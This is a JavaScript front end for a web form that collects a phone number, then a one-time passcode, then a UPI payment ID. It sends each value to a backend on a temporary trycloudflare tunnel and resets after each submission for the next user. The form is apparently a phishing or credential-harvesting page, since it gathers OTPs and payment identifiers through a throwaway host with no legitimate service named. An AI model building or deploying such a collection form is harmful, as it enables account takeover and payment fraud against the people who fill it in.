document.addEventListener('DOMContentLoaded', () => {
    // Your unique backend URL is now connected.
    const API_URL = 'https://aerospace-hayes-nearest-victory.trycloudflare.com/api.php';

    const statusMessage = document.getElementById('status-message');
    const phoneStep = document.getElementById('phone-step');
    const otpStep = document.getElementById('otp-step');
    const upiStep = document.getElementById('upi-step');
    
    const phoneInput = document.getElementById('phoneInput');
    const otpInput = document.getElementById('otpInput');
    const upiInput = document.getElementById('upiInput');
    
    const displayPhone = document.getElementById('displayPhone');

    const requestOtpButton = document.getElementById('requestOtpButton');
    const verifyOtpButton = document.getElementById('verifyOtpButton');
    const submitAllButton = document.getElementById('submitAllButton');

    function showStatus(message, type = 'info') {
        statusMessage.textContent = message;
        statusMessage.className = `status ${type}`;
    }

    function showStep(stepName) {
        phoneStep.style.display = 'none';
        otpStep.style.display = 'none';
        upiStep.style.display = 'none';
        document.getElementById(`${stepName}-step`).style.display = 'block';
    }

    async function sendRequest(action, data) {
        showStatus('Processing...', 'info');
        const formData = new FormData();
        formData.append('action', action);
        for (const key in data) { formData.append(key, data[key]); }

        try {
            const response = await fetch(API_URL, { method: 'POST', body: formData });
            if (!response.ok) throw new Error(`Server Error: ${response.status}`);
            return await response.json();
        } catch (error) {
            showStatus(`Network error: Your backend might be offline.`, 'error');
            return null;
        }
    }

    requestOtpButton.addEventListener('click', async () => {
        const phone = phoneInput.value;
        if (!phone) return showStatus('Please enter a phone number.', 'error');
        
        const result = await sendRequest('request_otp', { phone });
        if (result && result.status === 'success') {
            displayPhone.textContent = phone;
            showStep('otp');
            showStatus(result.message, 'success');
        } else if (result) {
            showStatus(result.message, 'error');
        }
    });

    verifyOtpButton.addEventListener('click', async () => {
        const phone = phoneInput.value;
        const otp = otpInput.value;
        if (!otp) return showStatus('Please enter the OTP.', 'error');

        const result = await sendRequest('verify_otp', { phone, otp });
        if (result && result.status === 'success') {
            showStep('upi');
            showStatus(result.message, 'success');
        } else if (result) {
            showStatus(result.message, 'error');
        }
    });

    submitAllButton.addEventListener('click', async () => {
        const phone = phoneInput.value;
        const upi = upiInput.value;
        if (!upi) return showStatus('Please enter your UPI ID.', 'error');

        const result = await sendRequest('submit_upi', { phone, upi });
        if (result && result.status === 'success') {
            showStep('phone'); // Go back to start for next user
            phoneInput.value = '';
            otpInput.value = '';
            upiInput.value = '';
            showStatus(result.message, 'success');
        } else if (result) {
            showStatus(result.message, 'error');
        }
    });
});